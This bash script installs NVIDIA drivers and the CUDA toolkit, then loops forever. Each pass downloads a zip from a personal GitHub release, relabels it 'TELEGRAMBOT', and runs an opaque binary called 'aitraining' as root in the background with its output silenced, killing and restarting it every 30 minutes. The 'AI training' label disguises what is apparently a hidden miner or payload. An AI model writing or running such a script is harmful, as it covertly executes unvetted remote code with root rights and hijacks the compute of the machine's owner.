#!/bin/bash

# CUDA installation state file
CUDA_FLAG="/var/tmp/cuda_installed"

sudo dpkg --configure -a
sudo apt install -y unzip

# 1. Install CUDA if not already installed
if [ ! -f "$CUDA_FLAG" ]; then
    echo "Bắt đầu cài đặt CUDA..."

    sudo apt update
    sudo apt install -y ubuntu-drivers-common
    sudo ubuntu-drivers install

    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/cuda-keyring_1.1-1_all.deb
    sudo apt install -y ./cuda-keyring_1.1-1_all.deb
    sudo apt update
    sudo apt -y install cuda-toolkit-11-8
    sudo apt -y full-upgrade

    sudo touch "$CUDA_FLAG"

    echo "Cài đặt CUDA hoàn tất. Khởi động lại hệ thống..."
    sudo reboot
    exit 0
fi

# 2. Loop to manage AI training lifecycle
while true; do
    echo "Starting AI training process..."

    if pgrep -x "aitraining" > /dev/null; then
        echo "Found existing aitraining process. Killing..."
        pkill -x "aitraining"
        sleep 5
    fi

    nohup bash -c '
        sudo apt install -y unzip

        # Download updated ZIP
        sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/asdc/mosa.zip

        sudo rm -rf TELEGRAMBOT
        sudo mkdir -p TELEGRAMBOT
        sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT

        cd TELEGRAMBOT || exit

        sudo chmod +x aitraining
        sudo ./aitraining -c config.json
    ' > /dev/null 2>&1 &

    echo "AI training started. It will run for 30 minutes."
    sleep 1800   # 30 minutes

    echo "Stopping AI training process..."
    if pgrep -x "aitraining" > /dev/null; then
        pkill -x "aitraining"
        echo "AI training stopped."
    else
        echo "AI training already exited."
    fi

    echo "Waiting 1 minute before restart..."
    sleep 60
done
